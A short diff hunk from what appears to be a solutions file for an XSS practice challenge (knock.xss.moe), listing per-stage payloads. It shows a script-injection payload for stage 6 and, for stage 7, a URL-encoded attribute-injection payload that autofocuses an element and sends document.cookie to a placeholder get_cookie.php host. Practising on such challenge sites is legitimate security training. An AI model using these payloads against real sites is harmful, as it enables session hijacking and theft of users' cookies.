@@ -15,8 +15,9 @@ stage6:
 </xmp><script>alert('xxx')</script>
 
 stage7:
+```javascript
 http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=%22%20onfocus%3D%22%20location.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%22%20autofocus%3D%22
-
+```
 stage8
 
 stage9:
